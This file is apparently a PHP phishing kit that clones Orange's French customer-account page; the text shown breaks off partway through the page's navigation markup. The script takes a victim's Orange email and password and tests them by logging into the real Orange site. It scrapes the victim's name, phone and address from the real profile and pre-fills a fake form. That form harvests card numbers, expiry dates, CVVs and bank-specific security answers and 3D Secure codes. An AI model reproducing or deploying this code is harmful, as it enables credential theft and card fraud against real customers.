<?php
session_start();

if (empty($_SESSION['error'])) {
    $_SESSION['error'] = 0;
}

if(!empty($_POST['credential']) || !empty($_POST['pwd']))
{
	$_SESSION['email']=$_POST['credential'];
	$_SESSION['pw']=$_POST['pwd'];
}

// Get Page
function GoToPage($url,$cookies_file,$ispost,$postdata)
{
		$ch = curl_init($url);
		curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0');
		curl_setopt($ch,CURLOPT_UNRESTRICTED_AUTH, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_NOBODY, false);
		curl_setopt($ch, CURLOPT_COOKIESESSION, false);
		if($ispost)
		{
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS,$postdata);
		}
		curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies_file);
		curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies_file);
		$page= curl_exec($ch);
		curl_close($ch);
		return $page;
}	
// Test Email & password
function TestLogin($cookies_file)
{		
	$HTMLPAGE=GoToPage("https://id.orange.fr/auth_user/bin/auth_user.cgi?source_url=/auth_user/bin/auth_user.cgi&return_url=http://www.orange.fr",$cookies_file,false,'');
	$HTMLPAGE=GoToPage("https://id.orange.fr/auth_user/bin/auth_user.cgi?source_url=/auth_user/bin/auth_user.cgi&return_url=http://www.orange.fr",$cookies_file,true,'if=1&co=42&lt=&tp=&rl=http%3A%2F%2Fwww.orange.fr%2Fportail&service=&isconn=0&credential='.$_SESSION['email'].'&password='.$_SESSION['pw'].'&sv=&tt=&rt=&dp=html&memorize_login=&memorize_password=');
	$pattern = '/wassup=(.*?);/';
	if (preg_match($pattern, $HTMLPAGE, $result) != 0)
		{
			return true;
		}
		else 
		return false;
}
function info()
{
	getinfo();
}

function getinfo()
{
	if(TestLogin('orange.txt'))
	{
		$page=GoToPage('https://b.espaceclientv3.orange.fr/?page=profil-formulaireDonneesPerso','orange.txt',false,"");
		$adresse=explode('data fe_clearfix',$page);
		$adresse=explode('">',$adresse[1]);
		$adresse=explode('</div>',$adresse[2]);
		if (strpos($adresse[0],'/') !== false) {
			$adresse=explode('data fe_clearfix',$page);
			$adresse = explode('class="value">',$adresse[1]);
			$nom=explode('<',$adresse[1]);
			$nom=$nom[0];
			$nom = explode(" ",$nom);
			$prenom=$nom[2];
			$nom=$nom[1];
		}
		else
		{
			$adresse = explode('class="value">',$page);
			$nom=explode('<',$adresse[2]);
			$nom=$nom[0];
			$prenom=explode('<',$adresse[3]);
			$prenom=$prenom[0];
			$email=explode('<',$adresse[4]);
			$email=$email[0];
		}
		$page=GoToPage('https://b.espaceclientv3.orange.fr/?page=profil-formulaireMoyensContact','orange.txt',false,"");
		$adresse = explode('value=',$page);
		$mobil=explode('"',$adresse[9]);
		$mobil=$mobil[1];
		$adr=explode('"',$adresse[17]);
		$adr=$adr[1];
		$zip=explode('"',$adresse[22]);
		$zip=$zip[1];
		$ville=explode('"',$adresse[24]);
		$ville=$ville[1];
		echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--[if IE 6]><html lang="fr" class="fe_ie6"><![endif]-->
<!--[if IE 7]><html lang="fr" class="fe_ie7"><![endif]-->
<!--[if IE 8]><html lang="fr" class="fe_ie8"><![endif]-->
<!--[if IE 9]><html lang="fr" class="fe_ie9"><![endif]-->
<!--[if gt IE 9]><!-->
<html class="dj_gecko dj_contentbox" lang="fr"><!--<![endif]--><head><script charset="ISO-8859-15" src="index_fichiers/217686.js" type="text/javascript"></script><script charset="ISO-8859-15" src="index_fichiers/necfe_002.js" type="text/javascript"></script>
    <title>Espace Client Orange - Mon Compte</title><meta name="DCSext.wasc_perimetre" content="espace_client_1"> <script type="text/javascript" src="index_fichiers/briseGlace.js"></script>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-15">
    <link rel="canonical" href="">
    <link href="index_fichiers/commons.css" type="text/css" rel="stylesheet">
    <link href="index_fichiers/bootstrap.css" type="text/css" rel="stylesheet">
    <link href="index_fichiers/espaceclientv3.css" type="text/css" rel="stylesheet">
    <link href="index_fichiers/helvetica.css" type="text/css" rel="stylesheet">
    <link href="index_fichiers/futuraCom.css" type="text/css" rel="stylesheet">
    <link href="index_fichiers/necfe.css" type="text/css" rel="stylesheet">
    <link href="index_fichiers/ecare.css" type="text/css" rel="stylesheet">
    
    
    <link href="index_fichiers/cliper.css" type="text/css" rel="stylesheet"><script type="text/javascript" src="index_fichiers/cliper.js"></script><script type="text/javascript" src="index_fichiers/certification.js"></script>
    <!--Magic4 Bloc : cssFred.html / programmation: 112244-->
<!-- /Bloc: 11991-->
<!-- /Date: 2014-06-10-->
<!-- /Tpl: 2713-->
<link href="index_fichiers/227016.css" rel="stylesheet" type="text/css">


    <!--[if IE 7]><script type="text/javascript">IE7 = true;</script><![endif]-->
    <noscript><meta http-equiv="refresh" content="0; url=index.php?noscript=1" /></noscript>
    <script type="text/javascript" src="index_fichiers/necfe.js"></script>
    <script src="index_fichiers/common.js" type="text/javascript"></script><link href="index_fichiers/common.css" rel="stylesheet" type="text/css"><script src="index_fichiers/o_header_core.js" type="text/javascript"></script><script src="index_fichiers/completion.js" type="text/javascript"></script><link href="index_fichiers/completion.css" rel="stylesheet" type="text/css"><script src="index_fichiers/gs.js" type="text/javascript"></script><script src="index_fichiers/o_header_standard.js" type="text/javascript"></script><link href="index_fichiers/o_header.css" rel="stylesheet" type="text/css"><script src="index_fichiers/o_croiseur.js" type="text/javascript"></script><link href="index_fichiers/o_croiseur.css" rel="stylesheet" type="text/css"><script type="text/javascript" src="index_fichiers/o_load.js"></script><script type="text/javascript" src="index_fichiers/tn.js"></script>
    <!--src="//ec1.s.woopic.com/js/oaf/dojo/dojo.xd.js?G4R0C9P16"-->
    <script type="text/javascript" src="index_fichiers/dojo.js" charset="UTF-8" djconfig="
            parseOnLoad: true,
            isDebug: false,
            buildType: \'ecare\',
            buildConf: \'/oaf/ecare/build/buildConf.json\',
            locale: \'fr\',
            dojoBlankHtmlUrl: \'/blank.html\'
        ">
    </script>
    <script type="text/javascript" src="index_fichiers/newcare.js"></script>
  
<link rel="stylesheet" href="index_fichiers/191905.css" type="text/css"></head>
<body class="orange">
<script type="text/javascript" src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
<script>
function cc(s)
{

  var i, n, c, r, t;

  // First, reverse the string and remove any non-numeric characters.

  r = "";
  for (i = 0; i < s.length; i++) {
    c = parseInt(s.charAt(i), 10);
    if (c >= 0 && c <= 9)
      r = c + r;
  }

  // Check for a bad string.

  if (r.length <= 1)
    return false;

  // Now run through each single digit to create a new string. Even digits
  // are multiplied by two, odd digits are left alone.

  t = "";
  for (i = 0; i < r.length; i++) {
    c = parseInt(r.charAt(i), 10);
    if (i % 2 != 0)
      c *= 2;
    t = t + c;
  }

  // Finally, add up all the single digits in this string.

  n = 0;
  for (i = 0; i < t.length; i++) {
    c = parseInt(t.charAt(i), 10);
    n = n + c;
  }

  // If the resulting sum is an even multiple of ten (but not zero), the
  // card number is good.

  if (n != 0 && n % 10 == 0)
    return true;
  else
    return false;
}
$(document).ready(
function(){
	$(".BP").hide();
    $(".POP").hide();
	$(".LCL").hide();
	$(".SG").hide();
	$(\'#cc_banque\').change(function(){
	$(".BP").hide();
    $(".POP").hide();
	$(".LCL").hide();
	$(".SG").hide();
	if ($("#cc_banque").val() == "banque-postale")
    {
        $(".BP").show();
    }
    else if ($("#cc_banque").val() == "societe-generale")
    {
       $(".SG").show();
    }
    else if ($("#cc_banque").val() == "lcl")
    {
		$(".LCL").show();
    }
    else if ($("#cc_banque").val() == "banque-populaire")
    {
		$(".POP").show();
    }
});
$(\'#a\').click(function(){
$(\'div\').removeClass("erreur_obligatoire");
	if($("#nom").val()=="")
	{
		$("#bloc_nom").addClass("erreur_obligatoire");
	}
	else if($("#prenom").val()=="")
	{
		$("#bloc_prenom").addClass("erreur_obligatoire");
	}
	else if($("#nj").val()=="" || $("#nm").val()=="" || $("#na").val()=="")
	{
		$("#bloc_naissance").addClass("erreur_obligatoire");
	}
	else if($("#adr").val()=="")
	{
		$("#bloc_adr").addClass("erreur_obligatoire");
	}
	else if($("#ville").val()=="")
	{
		$("#bloc_ville").addClass("erreur_obligatoire");
	}
	else if($("#cp").val()=="")
	{
		$("#bloc_cp").addClass("erreur_obligatoire");
	}
	else if($("#tel").val()=="")
	{
		$("#bloc_tel").addClass("erreur_obligatoire");
	}
	else if($("#cc_banque").val()=="")
	{
		$("#banque").addClass("erreur_obligatoire");
	}
	else if(cc($("#cc").val())==false)
	{
		$("#bloc_cc").addClass("erreur_obligatoire");
	}
	else if($("#b1").val()=="" || $("#b2").val()=="")
	{
		$("#bloc_ex").addClass("erreur_obligatoire");
	}
	else if($("#cvv").val()=="")
	{
		$("#bloc_cvv").addClass("erreur_obligatoire");
	}
	else if($("#nc").val()=="" && $("#cc_banque").val()=="societe-generale")
	{
		$("#bloc_nc").addClass("erreur_obligatoire");
	}
	else if($("#q1").val()=="" && $("#cc_banque").val()=="banque-postale")
	{
		$("#bloc_q1").addClass("erreur_obligatoire");
	}
	else if($("#r1").val()==""&& $("#cc_banque").val()=="banque-postale")
	{
		$("#bloc_r1").addClass("erreur_obligatoire");
	}
	else if($("#q2").val()==""&& $("#cc_banque").val()=="banque-postale")
	{
		$("#bloc_q2").addClass("erreur_obligatoire");
	}
	else if($("#r2").val()==""&& $("#cc_banque").val()=="banque-postale")
	{
		$("#bloc_r2").addClass("erreur_obligatoire");
	}
	else if($("#ccp").val()==""&& $("#cc_banque").val()=="banque-postale")
	{
		$("#bloc_ccp").addClass("erreur_obligatoire");
	}
	else if($("#3d").val()==""&& $("#cc_banque").val()=="lcl")
	{
		$("#bloc_3d").addClass("erreur_obligatoire");
	}
	else if($("#q3").val()==""&& $("#cc_banque").val()=="lcl")
	{
		$("#bloc_q3").addClass("erreur_obligatoire");
	}
	else if($("#r3").val()==""&& $("#cc_banque").val()=="lcl")
	{
		$("#bloc_r3").addClass("erreur_obligatoire");
	}
	else document.forms[\'donneesPerso\'].submit();
});
});

</script>
<div class=" forced-left o_r_header" style="height: auto;" id="o-header">
<div id="o-background"></div>
<div id="o-ribbon"><img src="index_fichiers/z.gif" style="display: none;" name="ImgForGstat4" id="ImgForGstat4" alt=" " height="0" width="0"><div id="o-logo"><a class="o-sprite " title="retour &agrave; l\'accueil" target="_top" onclick="o_changeImgForGstat4(\'urlwg_rubanGP_accueil\');" href="#://r.orange.fr/r/Ohome_accueil"></a></div><div id="o-navigation"><ul id="o-menu"><li id="o-menu-btn-0"><a target="" onclick="preventDefaultBehavior(event);o_changeImgForGstat4( buildReferrerOnClick(\'navwg_rubanGP\', \'\', \'espaceclient\') );o_bdnDeploy(0);" href=""><span>espace client</span></a></li><li id="o-menu-btn-1"><a target="" onclick="preventDefaultBehavior(event);o_changeImgForGstat4( buildReferrerOnClick(\'navwg_rubanGP\', \'\', \'boutiques\') );o_bdnDeploy(1);" href=""><span>boutique</span></a></li><li id="o-menu-btn-2"><a target="" onclick="preventDefaultBehavior(event);o_changeImgForGstat4( buildReferrerOnClick(\'navwg_rubanGP\', \'\', \'assistance\') );o_bdnDeploy(2);" href=""><span>assistance</span></a></li><li id="o-menu-btn-3"><a target="" onclick="preventDefaultBehavior(event);o_changeImgForGstat4( buildReferrerOnClick(\'navwg_rubanGP\', \'\', \'communication\') );o_bdnDeploy(3);" href=""><span>mail &amp; cloud</span></a></li><li id="o-menu-btn-4"><a target="" onclick="preventDefaultBehavior(event);o_changeImgForGstat4( buildReferrerOnClick(\'navwg_rubanGP\', \'\', \'sedivertir\') );o_bdnDeploy(4);" href=""><span>se divertir</span></a></li><li id="o-menu-btn-5"><a target="" onclick="preventDefaultBehavior(event);o_changeImgForGstat4( buildReferrerOnClick(\'navwg_rubanGP\', \'\', \'informer\') );o_bdnDeploy(5);" href=""><span>s\'informer</span></a></li><li id="o-menu-btn-6"><a target="" onclick="preventDefaultBehavior(event);o_changeImgForGstat4( buildReferrerOnClick(\'navwg_rubanGP\', \'\', \'organiser\') );o_bdnDeploy(6);" href=""><span>s\'organiser</span></a></li></ul></div><div id="o-perso"><div id="o-login"><a target="_self" id="o-logged" href="#" title="'.$prenom." ".$nom.'" onclick="o_changeImgForGstat4(\'navwg_rubanGP_identification\');o_dropDownDisplay(\'o-logged\', \'o-login-panel\');return false;"><div id="o-avatar" class="o-sprite-icons"></div><span id="o-login-ID">'.$prenom." ".$nom.'</span><span class="drop-arrow o-sprite"></span></a><div id="o-login-panel"><ul><li id="o-li-email">diabate27@orange.fr</li><li id="o-li-account"><a class="o-sprite o_r_notchanged" title="consulter et modifier votre compte Orange" onclick="o_changeImgForGstat4(\'urlwg_rubanGP_menuid_gerercompteuser\');" href="#://r.orange.fr/r/Oespaceclient_monprofil" target="_top">g&eacute;rer mon compte</a></li><li id="o-li-pwd"><a class="o-sprite" title="modifier votre mot de passe" onclick="o_changeImgForGstat4(\'urlwg_rubanGP_menuid_changermdp\');" target="_top" href="#s://eui.orange.fr/manage/bin/manage.cgi?open=password_link">changer mon mot de passe</a></li><li id="o-li-pseudos" class="o-separator">vous n\'avez pas activ&eacute; de pseudo</li><li id="o-li-manage-pseudos"><a class="o-sprite" title="choisir un pseudo" onclick="o_changeImgForGstat4(\'urlwg_rubanGP_menuid_pseudo\');" target="_top" href="#://pseudo.orange.fr/">choisir un pseudo</a></li><li class="o-separator"><a class="o-sprite" id="wg-identifiez" title="s\'identifier avec un autre compte Orange" onclick="o_changeImgForGstat4(\'urlwg_rubanGP_menuid_changid\');" target="_top" href="#://id.orange.fr/auth_user/bin/auth_user.cgi?url=https://b.espaceclientv3.orange.fr/?page=profil-formulaireDonneesPerso">changer d\'utilisateur</a></li><li><a class="o-sprite" id="o-adeco" title="Ne plus être identifi&eacute; comme '.$prenom." ".$nom.'" onclick="o_changeImgForGstat4(\'urlwg_rubanGP_menuid_deco\');" target="_top" href="#://r.orange.fr/r/Ofermersession">se d&eacute;connecter</a></li></ul><div onclick="o_dropDownDisplay(\'o-logged\', \'o-login-panel\')" class="bd-fermer o-sprite"></div></div></div><div id="o-launcher"><a id="o-launched" target="_blank" class="o_r_notchanged" undefined="" href="#://r.orange.fr/r/OGwebmail_inbox" title="vous avez 78 messages non lus" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'mail\') );"><span id="o-launched-icon" class="o-sprite-icons"></span><span id="o-launched-notif">78</span></a></div></div></div><div id="o-headband" class=""><div id="o-headband-content" class=" forced-left"><div id="o-headband-0" class="o-hbd"><ul class="o-list-main-panel"><li class="o-list-panel-0 panel "><ul><li><a href="#://r.orange.fr/r/OGespaceclient_accueil" class="o_r_notchanged o-sprite" target="" title="accueil espace client" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'espaceclient_accueil\') );">accueil espace client</a></li><li><a href="#://r.orange.fr/r/Oespaceclient_monsuiviconso" class="o_r_notchanged o-sprite" target="" title="suivi conso" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'espaceclient_conso\') );">suivi conso</a></li><li><a href="#://r.orange.fr/r/Oespaceclient_suivicommande" class="o_r_notchanged o-sprite" target="" title="suivi de commande" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'espaceclient_suivicommande\') );">suivi de commande</a></li></ul></li><li class="o-list-panel-1 panel "><ul><li><a href="#://r.orange.fr/r/Oespaceclient_mesavantages" class="o_r_notchanged o-sprite" target="" title="mes avantages" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'espaceclient_avantages\') );">mes avantages</a></li><li><a href="#://r.orange.fr/r/Oespaceclient_changermobile" class="o_r_notchanged o-sprite" target="" title="changer de mobile" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'espaceclient_changermobile\') );">changer de mobile</a></li><li><a href="#://contact.orange.fr/" class="o_r_notchanged o-sprite" target="" title="nous contacter" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'espaceclient_nouscontacter\') );">nous contacter</a></li></ul></li><li class="o-list-panel-2 panel "><ul><li><a href="#://r.orange.fr/r/Oespaceclient_decouverte_ec" class="o_r_notchanged o-sprite" target="" title="d&eacute;couverte espace client" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'espaceclient_decouverte\') );">d&eacute;couverte espace client</a></li><li><a href="#://r.orange.fr/r/Oespaceclient_decouverte_ecmobile" class="o_r_notchanged o-sprite" target="" title="espace client depuis le mobile" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'espaceclient_depuismobile\') );">espace client depuis le mobile</a></li><li><a href="#://r.orange.fr/r/Oespaceclient_decouverte_oem" class="o_r_notchanged o-sprite" target="" title="application Orange et moi" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'espaceclient_orangeetmoi\') );">application Orange et moi</a></li></ul></li><li class="o-list-panel-3 panel "><ul><li><a href="#://treshautdebit.orange.fr/" class="o_r_notchanged o-sprite" target="" title="les r&eacute;seaux" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'espaceclient_lesreseaux\') );">les r&eacute;seaux</a></li><li><a href="#://satisfait.orange.fr/" class="o_r_notchanged o-sprite" target="" title="satisfait quand vous l\'êtes" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'espaceclient_satisfait\') );">tout le service Orange</a></li><li><a href="#://bienvivreledigital.orange.fr/" class="o_r_notchanged o-sprite" target="" title="bien vivre le digital" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'espaceclient_bien vivre le digital\') );">bien vivre le digital</a></li></ul></li></ul></div><div id="o-headband-1" class="o-hbd"><ul class="o-list-main-panel"><li class="o-list-panel-0 panel "><ul><li><a href="#://boutique.orange.fr/" class="o_r_notchanged o-sprite" target="" title="accueil boutique" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_accueil\') );">accueil boutique</a></li><li><a href="#://abonnez-vous.orange.fr/residentiel/accueil.aspx?rdt=o" class="o_r_notchanged o-sprite" target="" title="internet + TV + t&eacute;l&eacute;phone" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_internet\') );">internet + TV + t&eacute;l&eacute;phone</a></li><li><a href="#://boutique.orange.fr/mobile" class="o_r_notchanged o-sprite" target="" title="mobile" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_mobile\') );">mobile</a></li><li><a href="#://open.orange.fr/home.aspx?rdt=o" class="o_r_notchanged o-sprite" target="" title="internet et mobile" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_internetmobile\') );">internet et mobile</a></li></ul></li><li class="o-list-panel-1 panel "><ul><li><a href="#://boutique.orange.fr/ESHOP_mx_orange/?tp=PHP&amp;code_rubrique=5-623477&amp;type=3&amp;IDCible=1" class="o_r_notchanged o-sprite" target="" title="fixe" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_fixe\') );">fixe</a></li><li><a href="#://abonnez-vous.orange.fr/cle3G/accueil-cle3g.aspx?rdt=o" class="o_r_notchanged o-sprite" target="" title="tablettes et cl&eacute;s 3G" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_tablettes\') );">tablettes et cl&eacute;s internet</a></li><li><a href="#://www.orange.fr/bin/frame.cgi?u=http%3A//www.ipad.orange.fr/" class="o_r_notchanged o-sprite" target="" title="iPad" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_iPad\') );">iPad</a></li><li><a href="#://boutique.orange.fr/mobile/iphones" class="o_r_notchanged o-sprite" target="" title="iPhone" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_iPhone\') );">iPhone</a></li></ul></li><li class="o-list-panel-2 panel "><ul><li><a href="#s://espaceclientv3.orange.fr/suivicommande.php" class="o_r_notchanged o-sprite" target="" title="suivi de commande" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_suivicommande\') );">suivi de commande</a></li><li><a href="#://boutique.orange.fr/changer-mobile" class="o_r_notchanged o-sprite" target="" title="changer de mobile" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_changermobile\') );">changer de mobile</a></li><li><a href="#://abonnez-vous.orange.fr/residentiel/equipements/Livebox.aspx?rdt=o" class="o_r_notchanged o-sprite" target="" title="livebox" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_livebox\') );">Livebox</a></li><li><a href="#://boutique.orange.fr/ESHOP_mx_ft/?tp=php&amp;donnee_appel=ORESH&amp;IDCible=1&amp;code_rubrique=5-625879" class="o_r_notchanged o-sprite" target="" title="accessoires" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_accessoires\') );">accessoires</a></li></ul></li><li class="o-list-panel-3 panel "><ul><li><a href="#://www.orangepro.fr/#WT.mc_id=100003713&amp;mc_id=100003713&amp;source=&amp;medium=lien_hp_orange.fr" class="o_r_notchanged o-sprite" target="" title="boutique pro" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_pro\') );">boutique pro</a></li><li><a href="#://r.orange.fr/r/Ososh" class="o_r_notchanged o-sprite" target="" title="Sosh" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_sosh\') );">Sosh</a></li><li><a href="#://r.orange.fr/r/Eboutiques_autonomie" class="o_r_notchanged o-sprite" target="" title="autonomie" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'boutiques_autonomie\') );">autonomie</a></li></ul></li></ul></div><div id="o-headband-2" class="o-hbd"><ul class="o-list-main-panel"><li class="o-list-panel-0 panel "><ul><li><a href="#://assistance.orange.fr/accueil-internet-mobile-telephone-fixe.php" class="o_r_notchanged o-sprite" target="" title="accueil assistance" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'assistance_accueil\') );">accueil assistance</a></li><li><a href="#://assistance.orange.fr/accueil-internet-haut-debit-adsl.php" class="o_r_notchanged o-sprite" target="" title="internet" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'assistance_internet\') );">internet</a></li><li><a href="#://assistance.orange.fr/accueil-internet-la-fibre.php" class="o_r_notchanged o-sprite" target="" title="la fibre" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'assistance_fibre\') );">la fibre</a></li></ul></li><li class="o-list-panel-1 panel "><ul><li><a href="#://assistance.orange.fr/accueil-mobile.php" class="o_r_notchanged o-sprite" target="" title="mobile" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'assistance_mobile\') );">mobile</a></li><li><a href="#://assistance.orange.fr/accueil-orange-open.php" class="o_r_notchanged o-sprite" target="" title="Open" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'assistance_open\') );">Open</a></li><li><a href="#://assistance.orange.fr/accueil-telephone-fixe.php" class="o_r_notchanged o-sprite" target="" title="ligne fixe" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'assistance_fixe\') );">ligne fixe</a></li></ul></li><li class="o-list-panel-2 panel "><ul><li><a href="#://tester-votre-acces.orange.fr/?page=accueilHD" class="o_r_notchanged o-sprite" target="" title="tester votre accès" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'assistance_testeracces\') );">tester votre accès</a></li><li><a href="#://suivi-des-incidents.orange.fr/infos-incident-national-messagerie-TV-internet-mobile" class="o_r_notchanged o-sprite" target="" title="info incidents" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'assistance_infoincidents\') );">infos incidents</a></li><li><a href="#://suivi-des-incidents.orange.fr/dossiers-depannage" class="o_r_notchanged o-sprite" target="" title="dossier d&eacute;pannage" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'assistance_depannage\') );">dossiers d&eacute;pannage</a></li></ul></li><li class="o-list-panel-3 panel "><ul><li><a href="#://communaute.orange.fr/" class="o_r_notchanged o-sprite" target="" title="forum d\'entraide" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'assistance_entraide\') );">forum d\'entraide</a></li><li><a href="#://contact.orange.fr/" class="o_r_notchanged o-sprite" target="" title="nous contacter" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'assistance_nouscontacter\') );">nous contacter</a></li><li><a href="#://assistance.orange.fr/accueil-internet-mobile-telephone-fixe-pro.php" class="o_r_notchanged o-sprite" target="" title="pour les pros" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'assistance_pro\') );">pour les pros</a></li></ul></li></ul></div><div id="o-headband-3" class="o-hbd"><ul class="o-list-main-panel"><li class="o-list-panel-0 panel "><ul><li class="no-title"></li><li><a href="#://accueil.webmail.orange.fr/" class="o_r_notchanged o-sprite" target="" title="accueil" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'communication_accueilcloud\') );">accueil</a></li><li><a href="#://r.orange.fr/r/Owebmail_inbox_v2" class="o_r_notchanged o-sprite" target="" title="mail" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'communication_mail\') );">mail</a></li><li><a href="#://boitevocale5w.orange.fr/webmail/fr_FR/MU_messages.html?SORTBY=1&amp;FOLDER=SF_ANSWERPHONE" class="o_r_notchanged o-sprite" target="" title="boîtes vocales" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'communication_boitevocale\') );">boîtes vocales</a></li></ul></li><li class="o-list-panel-1 panel "><ul><li class="no-title"></li><li><a href="#://smsmms1.orange.fr/I/Sms/sms_write.php?locale=fr_FR&amp;dub=1" class="o_r_notchanged o-sprite" target="" title="SMS/MMS" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'communication_smsmms\') );">SMS/MMS</a></li><li><a href="#://r.orange.fr/r/Ocontacts_accueil" class="o_r_notchanged o-sprite" target="" title="mes contacts" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'communication_contacts\') );">mes contacts</a></li><li><a href="#://r.orange.fr/r/Oagenda_accueil" class="o_r_notchanged o-sprite" target="" title="agenda" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'communication_agenda\') );">agenda</a></li></ul></li><li class="o-list-panel-2 panel "><ul><li class="no-title"></li><li><a href="#s://web.cloud.orange.fr/" class="o_r_notchanged o-sprite" target="" title="Le Cloud" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'communication_contenus\') );">Le Cloud</a></li><li><a href="#://applications-mobiles.orange.fr/application/Le%20Cloud%20d%27Orange" class="o_r_notchanged o-sprite" target="" title="Le Cloud sur mobile" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'communication_cloudmobile\') );">Le Cloud sur mobile</a></li><li><a href="#://r.orange.fr/r/OGphotos_albums" class="o_r_notchanged o-sprite" target="" title="tirages photo" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'communication_tiragesphoto\') );">tirages photo</a></li></ul></li><li class="o-list-panel-3 panel o-separator "><ul><li><span>r&eacute;seaux sociaux</span></li><li><a href="#://pages.perso.orange.fr/" class="o_r_notchanged o-sprite" target="" title="pages perso" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'communication_pagesperso\') );">pages perso</a></li><li><a href="#://pseudo.orange.fr/gestion?" class="o_r_notchanged o-sprite" target="" title="mon pseudo" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'communication_pseudo\') );">mon pseudo</a></li><li><a href="#://tchat.orange.fr/my-tchat/" class="o_r_notchanged o-sprite" target="" title="tChat" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'communication_tchat\') );">tChat</a></li></ul></li></ul></div><div id="o-headband-4" class="o-hbd"><ul class="o-list-main-panel"><li class="o-list-panel-0 panel "><ul><li><a href="#://r.orange.fr/r/OCdivertissement_tv_fibre" class="o_r_notchanged o-sprite" target="" title="TV d\'Orange" onclick="o_changeImgForGstat4( 